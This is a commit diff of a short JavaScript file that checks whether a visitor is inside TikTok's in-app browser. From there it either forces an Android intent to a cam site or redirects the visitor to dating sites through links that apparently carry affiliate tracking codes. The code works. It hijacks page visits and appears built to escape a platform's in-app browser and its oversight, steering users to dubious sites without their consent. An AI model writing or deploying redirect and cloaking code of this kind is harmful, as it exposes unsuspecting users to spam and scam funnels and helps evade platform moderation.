dadb1176b2d9da8a9f31b4ece2747f9fd4924e88
fixyourself2024 <Shaiji16@gmail.com>
2024-08-09 19:51:05 +0300

    Add files via upload

--- usrag.js
+++ usrag.js
@@ -1,9 +1,36 @@
+let body = document.querySelector('body');
 let agent = navigator.userAgent;
+let intik = document.querySelector('.intik');
+let outik = document.querySelector('.outik');
 
-if (agent.indexOf('music') >= 0) {
+if (
+  agent.indexOf('music') >= 0 ||
+  agent.indexOf('AppName') >= 0 ||
+  agent.indexOf('AppVersion') >= 0
+) {
   console.log('in tiktok app');
+  alert("in tiktok");
+
+  intik.setAttribute('id', 'show');
+  outik.setAttribute('id', 'hide');
+  location.replace(
+    'intent://watchmenow.cam/chat#Intent;scheme=http;action=android.intent.action.VIEW;end'
+  );
 } else {
-  window.location = 'https://lovepersonaldate.life/?u=rudktec&o=9kgp9mx';
-//  window.location = 'https://watchmenow.cam/';
+  console.log('not in tiktok app');
+  window.location = 'https://datinghugflirt.life/?u=13bk60m&o=0rygz59';
+  alert("not in tiktok");
+  body.setAttribute('class', 'black_bg');
+  intik.setAttribute('id', 'hide');
+  outik.setAttribute('id', 'show');
+
+  outik.addEventListener('click', () => {
+    window
+      .open('https://thelivelyromance.life/?u=13bk60m&o=0rupv4g', '_blank')
+      .focus();
+    //window.location = 'https://appinstallcheck.com/sl/069eo';
+
+    //window.location = 'https://watchmenow.cam/free/';
+  });
 }
 // document.querySelector('body').innerText = agent;
